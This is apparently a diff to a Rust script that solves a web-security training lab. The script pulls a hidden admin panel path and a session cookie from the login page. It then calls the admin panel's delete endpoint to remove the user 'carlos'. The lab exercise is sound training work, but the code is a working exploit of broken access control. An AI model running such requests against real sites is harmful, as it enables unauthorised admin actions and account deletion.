@@ -35,57 +35,64 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a0d00eb04df6a08802c99a9000300d8.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    // fetch /login page
     print!("{} ", "1. Fetching /login page..".white());
     io::stdout().flush();
+
+    // fetch /login page
     let get_login_page = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch /login page".red()));
-    println!("{}", "OK".green());
 
-    // exttract the admin panel path from the source code and the session cookie
+    println!("{}", "OK".green());
     print!(
         "{} ",
         "2. Extracting the admin panel path from the source code and the..".white()
     );
     io::stdout().flush();
+
+    // extract session cookie
     let session = extract_session_cookie(get_login_page.headers()).expect(&format!(
         "{}",
         "[!] Failed to extract the session cookie".red()
     ));
+
+    // extract admin panel path from source code
     let body = get_login_page.text().unwrap();
     let admin_panel_path = capture_pattern("'(/admin-.*)'", &body).expect(&format!(
         "{}",
         "[!] Failed to extract the admin panel path".red()
     ));
+
     println!("{} => {}", "OK".green(), admin_panel_path.yellow());
+    print!("{} ", "3. Fetching the admin panel..".white());
+    io::stdout().flush();
 
     // fetch the admin panel
     // this step in not necessary in the script, you can do step 4 directly
     // it's only a must when solving the lab using the browser
-    print!("{} ", "3. Fetching the admin panel..".white());
-    io::stdout().flush();
     let admin_panel = client
         .get(format!("{url}{admin_panel_path}"))
         .header("Cookie", format!("session={session}"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
-    println!("{}", "OK".green());
 
-    // delete carlos
+    println!("{}", "OK".green());
     print!("{} ", "4. Deleting carlos..".white());
     io::stdout().flush();
+
+    // delete carlos
     let delete_carlos = client
         .get(format!("{url}{admin_panel_path}/delete?username=carlos"))
         .header("Cookie", format!("session={session}"))
         .send()
         .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
